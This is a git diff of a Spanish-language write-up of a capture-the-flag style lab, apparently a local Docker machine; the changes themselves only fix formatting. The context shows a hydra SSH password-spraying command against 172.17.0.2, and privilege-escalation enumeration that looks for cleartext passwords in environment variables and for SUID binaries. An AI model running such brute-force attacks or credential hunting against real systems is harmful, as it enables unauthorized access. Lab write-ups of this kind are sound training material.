@@ -184,7 +184,7 @@ Teniendo un diccionario y una pass vamos a lanzar un ataque al puerto 22 para ve
 ```bash
 hydra -L nombres.txt -p purpl3 -t 16 -V -f -I ssh://172.17.0.2
 ```
-```                                                                                                                   ░▒▓ ✔ 
+```                                                                                                                   
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-13 14:02:29
@@ -234,7 +234,7 @@ valentina:x:1001:1001::/home/valentina:/bin/bash
 apàrte de pedro está valentina y root, to empiezo siempre con id, para ver si hay algún grupo privilegiado,
 despues con printenv que he llegado a ver contraseñas en texto claro en la variable de entorno, despues permisos suid y luego procesos
 en permisos suid vemos:
-````
+```
 find / -perm -4000 2>/dev/null
 /usr/bin/chfn
 /usr/bin/passwd
